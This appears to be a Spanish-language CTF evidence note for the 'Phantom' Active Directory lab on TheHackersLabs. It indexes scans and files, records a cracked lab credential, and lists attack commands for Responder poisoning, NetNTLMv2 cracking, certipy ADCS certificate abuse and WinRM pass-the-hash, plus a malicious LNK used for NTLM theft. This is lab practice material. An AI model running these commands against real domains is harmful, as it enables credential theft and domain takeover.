---
tags: [ctf, thehackerslabs, windows, evidencias, active-directory]
tipo: evidencias
---

# Phantom — Evidencias

> [!warning] Origen
> Basado en [[Phantom - Roadmap]] y [[Phantom]] (evidencia original, 2026-10-16). Fuente adicional: `~/CTF/maquina-100/RECON.md` (reconocimiento).

## Originales

| # | Tipo | Descripción | Ruta | Origen |
|---|---|---|---|---|
| 1 | md | Nota principal | `01-CTF/TheHackersLabs/Phantom/Phantom.md` | sesión original |
| 2 | md | Roadmap/writeup completo | `01-CTF/TheHackersLabs/Phantom/Phantom - Roadmap.md` | sesión original |
| 3 | md | RECON de Phantom | `~/CTF/maquina-100/RECON.md` | sesión original |
| 4 | nmap | `nmap_phantom_allports.*`, `nmap_phantom_services.*`, `nmap_udp_top20.*`, `nmap_dhcp_discover.*` | `~/CTF/maquina-100/scans/` | sesión original |
| 5 | bak | `dacledit-20261016-170022.bak`, `dacledit-20261016-170037.bak` | `01-CTF/TheHackersLabs/Phantom/` | sesión original |

## Reconstrucciones

| # | Qué | Base |
|---|---|---|
| 1 | Ruta de ACLs mark→bob→frank | salida de BloodHound |
| 2 | Hash NetNTLMv2 de robert | captura de Responder |

## Inferencias (no verificadas)

- El **valor literal** del hash NTLMv2 capturado no se conserva en las notas; se documenta el resultado (`robert:bLink182`).

## Comandos clave reproducibles

```bash
bloodhound-python -u mark -p '<pw>' -d PHANTOM.THL -dc dc01.phantom.thl -ns 192.168.56.100 -c All --zip
sudo responder -I vboxnet0 -wv
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robert.hash
certipy-ad find -u tomas@phantom.thl -p '<pw>' -dc-ip 192.168.56.100 -vulnerable -stdout
certipy-ad auth -pfx administrador.pfx -dc-ip 192.168.56.100
netexec winrm 192.168.56.100 -u Administrador -H <ntlm>
```

## Artefactos generados

| Artefacto | Ruta | Notas |
|---|---|---|
| `config.lnk` | local | LNK malicioso para NTLM theft |
| `tomas.pfx`, `administrador.pfx` | local | certificados ADCS |
| `robert.hash` | local | hash NetNTLMv2 |
